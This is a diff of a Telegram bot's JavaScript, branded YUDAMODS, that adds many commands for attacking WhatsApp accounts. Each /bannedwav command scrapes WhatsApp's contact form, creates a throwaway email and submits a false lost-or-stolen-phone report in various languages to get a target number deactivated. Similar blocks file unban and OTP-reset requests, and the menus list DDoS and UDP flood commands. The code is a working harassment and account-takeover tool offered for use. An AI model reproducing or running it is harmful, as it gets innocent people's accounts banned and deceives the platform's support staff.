@@ -80,6 +80,7 @@ bot.command('jpm', (ctx) => {
 
 bot.on('text', async (ctx) => {
   const message = ctx.message.text;
+  const messageText = ctx.message.text;
   const command = message.split(' ')[0];
   const now = new Date();
   const hour = now.getHours();
@@ -104,7 +105,6 @@ bot.on('text', async (ctx) => {
 ┃⿻ /pushkontakmenu
 ┃⿻ /allmenu
 ┃⿻ /ddosmenu
-┃⿻ /panelmenu
 ┃⿻ /verifymenu
 ┗━━━━━[ YUDAMODS  ]━━━━
        
@@ -126,7 +126,18 @@ bot.on('text', async (ctx) => {
 
 ┏━━━━━[ LIST 𝗠𝗘𝗡𝗨 ]━━━━━
 ┃⿻ /bannedwa
+┃⿻ /bannedwav2
+┃⿻ /bannedwav3
+┃⿻ /bannedwav4
+┃⿻ /bannedwav5
 ┃⿻ /unbanwa
+┃⿻ /unbanwav2
+┃⿻ /unbanwav3
+┃⿻ /unbanwav4
+┃⿻ /unbanwav5
+┃⿻ /resetotpwa
+┃⿻ /resetotpwav2
+┃⿻ /resetotpwav3
 ┃⿻ /temp
 ┗━━━━━[ YUDAMODS  ]━━━━
        
@@ -149,7 +160,18 @@ bot.on('text', async (ctx) => {
 ┏━━━━━[ LIST 𝗠𝗘𝗡𝗨 ]━━━━━
 ┃⿻ /menu
 ┃⿻ /bannedwa
+┃⿻ /bannedwav2
+┃⿻ /bannedwav3
+┃⿻ /bannedwav4
+┃⿻ /bannedwav5
 ┃⿻ /unbanwa
+┃⿻ /unbanwav2
+┃⿻ /unbanwav3
+┃⿻ /unbanwav4
+┃⿻ /unbanwav5
+┃⿻ /resetotpwa
+┃⿻ /resetotpwav2
+┃⿻ /resetotpwav3
 ┃⿻ /temp
 ┃⿻ /pushkontakmenu
 ┃⿻ /allmenu
@@ -160,30 +182,6 @@ bot.on('text', async (ctx) => {
 ┃⿻ /jpm
 ┃⿻ /bc
 ┃⿻ /udp
-┃⿻ /panel
-┃⿻ /listram
-┃⿻ /addprem
-┃⿻ /delprem
-┃⿻ /addowner
-┃⿻ /delowner
-┃⿻ /delsrv
-┃⿻ /delusr
-┃⿻ /1gb
-┃⿻ /2gb
-┃⿻ /3gb
-┃⿻ /4gb
-┃⿻ /5gb
-┃⿻ /4gb
-┃⿻ /5gb
-┃⿻ /6gb
-┃⿻ /7gb
-┃⿻ /9gb
-┃⿻ /10gb
-┃⿻ /unli
-┃⿻ /createadmin
-┃⿻ /listsrv
-┃⿻ /listadmin
-┃⿻ /
 ┗━━━━━[ YUDAMODS  ]━━━━
        
           ⌕ █║▌║▌║ - ║▌║▌║█ ⌕`;
@@ -400,6 +398,556 @@ case '/udp':
                 form.append("email_confirm", email.data[0]);
                 form.append("platform", "ANDROID");
                 form.append("your_message", "مرحبًا ، أنا رودولفو ، أحتاج إلى مساعدتك ، لقد سُرق هاتفي المحمول ومعه شريحتي مع WhatsApp ، لا أريد أن أفسد أشيائي الشخصية ، مثل الأشياء من شركتي وخططي ، أريد رقمي معطل! حتى أتمكن من استعادة بطاقة Sim أو محاولة استرداد هاتفي! الرقم");
+                form.append("__user", "0");
+                form.append("__a", "1");
+                form.append("__csr", "");
+                form.append("__req", "8");
+                form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
+                form.append("dpr", "1");
+                form.append("__ccg", "UNKNOWN");
+                form.append("__rev", "1006630858");
+                form.append("__comment_req", "0");
+
+                const res = await axios({
+                    url,
+                    method: "POST",
+                    data: form,
+                    headers: {
+                        cookie
+                    }
+                });
+
+                const responseData = JSON.parse(res.data.replace("for (;;);", ""));
+                ctx.reply(util.format(responseData));
+            } catch (error) {
+                ctx.reply(`Oops! Something went wrong: ${error.message}`);
+            }
+            break;
+            case '/bannedwav2':
+            const bannedwav2Args = message.split(' ');
+            const bannedwav2PhoneNumber = bannedwav2Args.length > 1 ? bannedwav2Args[1] : null;
+            if (!bannedwav2PhoneNumber) {
+                ctx.replyWithPhoto(thumbPath, { caption: "Please provide the target phone number."});
+                return;
+            }
+            try {
+                const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
+                const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
+                const cookie = ntah.headers["set-cookie"].join("; ");
+                const $ = cheerio.load(ntah.data);
+                const $form = $("form");
+                const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
+                const form = new URLSearchParams();
+
+                form.append("jazoest", $form.find("input[name=jazoest]").val());
+                form.append("lsd", $form.find("input[name=lsd]").val());
+                form.append("step", "submit");
+                form.append("country_selector", "ID");
+                form.append("phone_number", bannedwav2PhoneNumber);
+                form.append("email", email.data[0]);
+                form.append("email_confirm", email.data[0]);
+                form.append("platform", "ANDROID");
+                form.append("your_message", "Hola, aghju persu i mo documenti cù u mo telefunu è a carta SIM. dunque vogliu chì disattiveghjanu u mo numeru immediatamente sò statu piratatu, aghju paura chì qualchissia pò entra in u mo contu WhatsApp perchè anu infurmazioni impurtanti nantu à mè u numeru hè");
+                form.append("__user", "0");
+                form.append("__a", "1");
+                form.append("__csr", "");
+                form.append("__req", "8");
+                form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
+                form.append("dpr", "1");
+                form.append("__ccg", "UNKNOWN");
+                form.append("__rev", "1006630858");
+                form.append("__comment_req", "0");
+
+                const res = await axios({
+                    url,
+                    method: "POST",
+                    data: form,
+                    headers: {
+                        cookie
+                    }
+                });
+
+                const responseData = JSON.parse(res.data.replace("for (;;);", ""));
+                ctx.reply(util.format(responseData));
+            } catch (error) {
+                ctx.reply(`Oops! Something went wrong: ${error.message}`);
+            }
+            break;
+            case '/bannedwav3':
+            const bannedwav3Args = message.split(' ');
+            const bannedwav3PhoneNumber = bannedwav3Args.length > 1 ? bannedwav3Args[1] : null;
+            if (!bannedwav3PhoneNumber) {
+                ctx.replyWithPhoto(thumbPath, { caption: "Please provide the target phone number."});
+                return;
+            }
+            try {
+                const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
+                const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
+                const cookie = ntah.headers["set-cookie"].join("; ");
+                const $ = cheerio.load(ntah.data);
+                const $form = $("form");
+                const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
+                const form = new URLSearchParams();
+
+                form.append("jazoest", $form.find("input[name=jazoest]").val());
+                form.append("lsd", $form.find("input[name=lsd]").val());
+                form.append("step", "submit");
+                form.append("country_selector", "ID");
+                form.append("phone_number", bannedwav3PhoneNumber);
+                form.append("email", email.data[0]);
+                form.append("email_confirm", email.data[0]);
+                form.append("platform", "ANDROID");
+                form.append("your_message", "Hola, soy nuevo en la aplicación de WhatsApp, y hoy en el primer día noté que un usuario usaba otra versión modificada de WhatsApp, por lo que presenté esta denuncia, espero que el Equipo de WhatsApp bloquee el número");
+                form.append("__user", "0");
+                form.append("__a", "1");
+                form.append("__csr", "");
+                form.append("__req", "8");
+                form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
+                form.append("dpr", "1");
+                form.append("__ccg", "UNKNOWN");
+                form.append("__rev", "1006630858");
+                form.append("__comment_req", "0");
+
+                const res = await axios({
+                    url,
+                    method: "POST",
+                    data: form,
+                    headers: {
+                        cookie
+                    }
+                });
+
+                const responseData = JSON.parse(res.data.replace("for (;;);", ""));
+                ctx.reply(util.format(responseData));
+            } catch (error) {
+                ctx.reply(`Oops! Something went wrong: ${error.message}`);
+            }
+            break;
+            case '/bannedwav4':
+            const bannedwav4Args = message.split(' ');
+            const bannedwav4PhoneNumber = bannedwav4Args.length > 1 ? bannedwav4Args[1] : null;
+            if (!bannedwav4PhoneNumber) {
+                ctx.replyWithPhoto(thumbPath, { caption: "Please provide the target phone number."});
+                return;
+            }
+            try {
+                const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
+                const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
+                const cookie = ntah.headers["set-cookie"].join("; ");
+                const $ = cheerio.load(ntah.data);
+                const $form = $("form");
+                const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
+                const form = new URLSearchParams();
+
+                form.append("jazoest", $form.find("input[name=jazoest]").val());
+                form.append("lsd", $form.find("input[name=lsd]").val());
+                form.append("step", "submit");
+                form.append("country_selector", "ID");
+                form.append("phone_number", bannedwav4PhoneNumber);
+                form.append("email", email.data[0]);
+                form.append("email_confirm", email.data[0]);
+                form.append("platform", "ANDROID");
+                form.append("your_message", "Porfavor,desative o número da minha conta ,o chip e os documentos foram roubados essa conta possuí dados importante, então, por favor desative minha conta");
+                form.append("__user", "0");
+                form.append("__a", "1");
+                form.append("__csr", "");
+                form.append("__req", "8");
+                form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
+                form.append("dpr", "1");
+                form.append("__ccg", "UNKNOWN");
+                form.append("__rev", "1006630858");
+                form.append("__comment_req", "0");
+
+                const res = await axios({
+                    url,
+                    method: "POST",
+                    data: form,
+                    headers: {
+                        cookie
+                    }
+                });
+
+                const responseData = JSON.parse(res.data.replace("for (;;);", ""));
+                ctx.reply(util.format(responseData));
+            } catch (error) {
+                ctx.reply(`Oops! Something went wrong: ${error.message}`);
+            }
+            break;
+            case '/bannedwav5':
+            const bannedwav5Args = message.split(' ');
+            const bannedwav5PhoneNumber = bannedwav5Args.length > 1 ? bannedwav5Args[1] : null;
+            if (!bannedwav5PhoneNumber) {
+                ctx.replyWithPhoto(thumbPath, { caption: "Please provide the target phone number."});
+                return;
+            }
+            try {
+                const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
+                const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
+                const cookie = ntah.headers["set-cookie"].join("; ");
+                const $ = cheerio.load(ntah.data);
+                const $form = $("form");
+                const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
+                const form = new URLSearchParams();
+
+                form.append("jazoest", $form.find("input[name=jazoest]").val());
+                form.append("lsd", $form.find("input[name=lsd]").val());
+                form.append("step", "submit");
+                form.append("country_selector", "ID");
+                form.append("phone_number", bannedwav5PhoneNumber);
+                form.append("email", email.data[0]);
+                form.append("email_confirm", email.data[0]);
+                form.append("platform", "ANDROID");
+                form.append("your_message", "Olá, perdi meu dispositivo e cartão SIM, por isso imploro que desative meu número imediatamente");
+                form.append("__user", "0");
+                form.append("__a", "1");
+                form.append("__csr", "");
+                form.append("__req", "8");
+                form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
+                form.append("dpr", "1");
+                form.append("__ccg", "UNKNOWN");
+                form.append("__rev", "1006630858");
+                form.append("__comment_req", "0");
+
+                const res = await axios({
+                    url,
+                    method: "POST",
+                    data: form,
+                    headers: {
+                        cookie
+                    }
+                });
+
+                const responseData = JSON.parse(res.data.replace("for (;;);", ""));
+                ctx.reply(util.format(responseData));
+            } catch (error) {
+                ctx.reply(`Oops! Something went wrong: ${error.message}`);
+            }
+            break;
+            case '/unbanwav2':
+            const unbanwav2Args = message.split(' ');
+            const unbanwav2PhoneNumber = unbanwav2Args.length > 1 ? unbanwav2Args[1] : null;
+            if (!unbanwav2PhoneNumber) {
+                ctx.replyWithPhoto(thumbPath, { caption: "Please provide the target phone number."});
+                return;
+            }
+            try {
+                const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
+                const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
+                const cookie = ntah.headers["set-cookie"].join("; ");
+                const $ = cheerio.load(ntah.data);
+                const $form = $("form");
+                const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
+                const form = new URLSearchParams();
+
+                form.append("jazoest", $form.find("input[name=jazoest]").val());
+                form.append("lsd", $form.find("input[name=lsd]").val());
+                form.append("step", "submit");
+                form.append("country_selector", "ID");
+                form.append("phone_number", unbanwav2PhoneNumber);
+                form.append("email", email.data[0]);
+                form.append("email_confirm", email.data[0]);
+                form.append("platform", "ANDROID");
+                form.append("your_message", "Olá Equipe, o sistema de vocês baniram meu número por engano. Peço que vocês reativem meu número pois tenho família em outro país e preciso me comunicar com eles");
+                form.append("__user", "0");
+                form.append("__a", "1");
+                form.append("__csr", "");
+                form.append("__req", "8");
+                form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
+                form.append("dpr", "1");
+                form.append("__ccg", "UNKNOWN");
+                form.append("__rev", "1006630858");
+                form.append("__comment_req", "0");
+
+                const res = await axios({
+                    url,
+                    method: "POST",
+                    data: form,
+                    headers: {
+                        cookie
+                    }
+                });
+
+                const responseData = JSON.parse(res.data.replace("for (;;);", ""));
+                ctx.reply(util.format(responseData));
+            } catch (error) {
+                ctx.reply(`Oops! Something went wrong: ${error.message}`);
+            }
+            break;
+            case '/unbanwav3':
+            const unbanwav3Args = message.split(' ');
+            const unbanwav3PhoneNumber = unbanwav3Args.length > 1 ? unbanwav3Args[1] : null;
+            if (!unbanwav3PhoneNumber) {
+                ctx.replyWithPhoto(thumbPath, { caption: "Please provide the target phone number."});
+                return;
+            }
+            try {
+                const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
+                const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
+                const cookie = ntah.headers["set-cookie"].join("; ");
+                const $ = cheerio.load(ntah.data);
+                const $form = $("form");
+                const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
+                const form = new URLSearchParams();
+
+                form.append("jazoest", $form.find("input[name=jazoest]").val());
+                form.append("lsd", $form.find("input[name=lsd]").val());
+                form.append("step", "submit");
+                form.append("country_selector", "ID");
+                form.append("phone_number", unbanwav3PhoneNumber);
+                form.append("email", email.data[0]);
+                form.append("email_confirm", email.data[0]);
+                form.append("platform", "ANDROID");
+                form.append("your_message", "Olá equipe de suporte, O meu Whatsapp foi banido e eu não consigo recuperar minha conta. Estou sem o mesmo por conversar com minha familia e meus colegas de trabalho. Ja fiz os procedimentos que achei na internet mas ate agora não obtive retorno do Whatsapp. Como recuperar minha conta?");
+                form.append("__user", "0");
+                form.append("__a", "1");
+                form.append("__csr", "");
+                form.append("__req", "8");
+                form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
+                form.append("dpr", "1");
+                form.append("__ccg", "UNKNOWN");
+                form.append("__rev", "1006630858");
+                form.append("__comment_req", "0");
+
+                const res = await axios({
+                    url,
+                    method: "POST",
+                    data: form,
+                    headers: {
+                        cookie
+                    }
+                });
+
+                const responseData = JSON.parse(res.data.replace("for (;;);", ""));
+                ctx.reply(util.format(responseData));
+            } catch (error) {
+                ctx.reply(`Oops! Something went wrong: ${error.message}`);
+            }
+            break;
+            case '/unbanwav4':
+            const unbanwav4Args = message.split(' ');
+            const unbanwav4PhoneNumber = unbanwav4Args.length > 1 ? unbanwav4Args[1] : null;
+            if (!unbanwav4PhoneNumber) {
+                ctx.replyWithPhoto(thumbPath, { caption: "Please provide the target phone number."});
+                return;
+            }
+            try {
+                const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
+                const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
+                const cookie = ntah.headers["set-cookie"].join("; ");
+                const $ = cheerio.load(ntah.data);
+                const $form = $("form");
+                const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
+                const form = new URLSearchParams();
+
+                form.append("jazoest", $form.find("input[name=jazoest]").val());
+                form.append("lsd", $form.find("input[name=lsd]").val());
+                form.append("step", "submit");
+                form.append("country_selector", "ID");
+                form.append("phone_number", unbanwav4PhoneNumber);
+                form.append("email", email.data[0]);
+                form.append("email_confirm", email.data[0]);
+                form.append("platform", "ANDROID");
+                form.append("your_message", "Hallo, saya tidak melakukan kesalahan apapun, tiba-tiba nomor saya di nonaktifkan ketika masuk ke grup maka saya mohon kepada pihak whatsapp yang terhormat, tolong aktifkan kembali nomor saya");
+                form.append("__user", "0");
+                form.append("__a", "1");
+                form.append("__csr", "");
+                form.append("__req", "8");
+                form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
+                form.append("dpr", "1");
+                form.append("__ccg", "UNKNOWN");
+                form.append("__rev", "1006630858");
+                form.append("__comment_req", "0");
+
+                const res = await axios({
+                    url,
+                    method: "POST",
+                    data: form,
+                    headers: {
+                        cookie
+                    }
+                });
+
+                const responseData = JSON.parse(res.data.replace("for (;;);", ""));
+                ctx.reply(util.format(responseData));
+            } catch (error) {
+                ctx.reply(`Oops! Something went wrong: ${error.message}`);
+            }
+            break;
+            case '/unbanwav5':
+            const unbanwav5Args = message.split(' ');
+            const unbanwav5PhoneNumber = unbanwav5Args.length > 1 ? unbanwav5Args[1] : null;
+            if (!unbanwav5PhoneNumber) {
+                ctx.replyWithPhoto(thumbPath, { caption: "Please provide the target phone number."});
+                return;
+            }
+            try {
+                const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
+                const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
+                const cookie = ntah.headers["set-cookie"].join("; ");
+                const $ = cheerio.load(ntah.data);
+                const $form = $("form");
+                const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
+                const form = new URLSearchParams();
+
+                form.append("jazoest", $form.find("input[name=jazoest]").val());
+                form.append("lsd", $form.find("input[name=lsd]").val());
+                form.append("step", "submit");
+                form.append("country_selector", "ID");
+                form.append("phone_number", unbanwav5PhoneNumber);
+                form.append("email", email.data[0]);
+                form.append("email_confirm", email.data[0]);
+                form.append("platform", "ANDROID");
+                form.append("your_message", "Please reactivate my number because I didn't violate any WhatsApp rules, suddenly my number was banned, please reactivate this number");
+                form.append("__user", "0");
+                form.append("__a", "1");
+                form.append("__csr", "");
+                form.append("__req", "8");
+                form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
+                form.append("dpr", "1");
+                form.append("__ccg", "UNKNOWN");
+                form.append("__rev", "1006630858");
+                form.append("__comment_req", "0");
+
+                const res = await axios({
+                    url,
+                    method: "POST",
+                    data: form,
+                    headers: {
+                        cookie
+                    }
+                });
+
+                const responseData = JSON.parse(res.data.replace("for (;;);", ""));
+                ctx.reply(util.format(responseData));
+            } catch (error) {
+                ctx.reply(`Oops! Something went wrong: ${error.message}`);
+            }
+            break;
+            case '/resetotpwav2':
+            const resetotpwav2Args = message.split(' ');
+            const resetotpwav2PhoneNumber = resetotpwav2Args.length > 1 ? resetotpwav2Args[1] : null;
+            if (!resetotpwav2PhoneNumber) {
+                ctx.replyWithPhoto(thumbPath, { caption: "Please provide the target phone number."});
+                return;
+            }
+            try {
+                const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
+                const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
+                const cookie = ntah.headers["set-cookie"].join("; ");
+                const $ = cheerio.load(ntah.data);
+                const $form = $("form");
+                const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
+                const form = new URLSearchParams();
+
+                form.append("jazoest", $form.find("input[name=jazoest]").val());
+                form.append("lsd", $form.find("input[name=lsd]").val());
+                form.append("step", "submit");
+                form.append("country_selector", "ID");
+                form.append("phone_number", resetotpwav2PhoneNumber);
+                form.append("email", email.data[0]);
+                form.append("email_confirm", email.data[0]);
+                form.append("platform", "ANDROID");
+                form.append("your_message", "Dear WhatsApp Saya Mengalami Kesulitan menerima kode verifikasi tidak masuk sms nomer WhatsApp saya");
+                form.append("__user", "0");
+                form.append("__a", "1");
+                form.append("__csr", "");
+                form.append("__req", "8");
+                form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
+                form.append("dpr", "1");
+                form.append("__ccg", "UNKNOWN");
+                form.append("__rev", "1006630858");
+                form.append("__comment_req", "0");
+
+                const res = await axios({
+                    url,
+                    method: "POST",
+                    data: form,
+                    headers: {
+                        cookie
+                    }
+                });
+
+                const responseData = JSON.parse(res.data.replace("for (;;);", ""));
+                ctx.reply(util.format(responseData));
+            } catch (error) {
+                ctx.reply(`Oops! Something went wrong: ${error.message}`);
+            }
+            break;
+            case '/resetotpwa':
+            const resetotpwaArgs = message.split(' ');
+            const resetotpwaPhoneNumber = resetotpwaArgs.length > 1 ? resetotpwaArgs[1] : null;
+            if (!resetotpwaPhoneNumber) {
+                ctx.replyWithPhoto(thumbPath, { caption: "Please provide the target phone number."});
+                return;
+            }
+            try {
+                const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
+                const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
+                const cookie = ntah.headers["set-cookie"].join("; ");
+                const $ = cheerio.load(ntah.data);
+                const $form = $("form");
+                const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
+                const form = new URLSearchParams();
+
+                form.append("jazoest", $form.find("input[name=jazoest]").val());
+                form.append("lsd", $form.find("input[name=lsd]").val());
+                form.append("step", "submit");
+                form.append("country_selector", "ID");
+                form.append("phone_number", resetotpwaPhoneNumber);
+                form.append("email", email.data[0]);
+                form.append("email_confirm", email.data[0]);
+                form.append("platform", "ANDROID");
+                form.append("your_message", "seseorang meminta kode secara tidak sengaja. Nomor saya yang saya gunakan untuk bekerja Saya memiliki perusahaan ventura dan saya memerlukan akun ini, harap hapus Waktu dari nomor saya. Setel ulang kode SMS saya");
+                form.append("__user", "0");
+                form.append("__a", "1");
+                form.append("__csr", "");
+                form.append("__req", "8");
+                form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
+                form.append("dpr", "1");
+                form.append("__ccg", "UNKNOWN");
+                form.append("__rev", "1006630858");
+                form.append("__comment_req", "0");
+
+                const res = await axios({
+                    url,
+                    method: "POST",
+                    data: form,
+                    headers: {
+                        cookie
+                    }
+                });
+
+                const responseData = JSON.parse(res.data.replace("for (;;);", ""));
+                ctx.reply(util.format(responseData));
+            } catch (error) {
+                ctx.reply(`Oops! Something went wrong: ${error.message}`);
+            }
+            break;
+            case '/resetotpwav3':
+            const resetotpwav3Args = message.split(' ');
+            const resetotpwav3PhoneNumber = resetotpwav3Args.length > 1 ? resetotpwav3Args[1] : null;
+            if (!resetotpwav3PhoneNumber) {
+                ctx.replyWithPhoto(thumbPath, { caption: "Please provide the target phone number."});
+                return;
+            }
+            try {
+                const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
+                const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
+                const cookie = ntah.headers["set-cookie"].join("; ");
+                const $ = cheerio.load(ntah.data);
+                const $form = $("form");
+                const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
+                const form = new URLSearchParams();
+
+                form.append("jazoest", $form.find("input[name=jazoest]").val());
+                form.append("lsd", $form.find("input[name=lsd]").val());
+                form.append("step", "submit");
+                form.append("country_selector", "ID");
+                form.append("phone_number", resetotpwav3PhoneNumber);
+                form.append("email", email.data[0]);
+                form.append("email_confirm", email.data[0]);
+                form.append("platform", "ANDROID");
+                form.append("your_message", "Olá, por favor, encontre o código OTP para este número porque outra pessoa se conectou acidentalmente ao meu número e eu tenho que esperar 8 horas, por favor, procure este número novamente");
                 form.append("__user", "0");
                 form.append("__a", "1");
                 form.append("__csr", "");
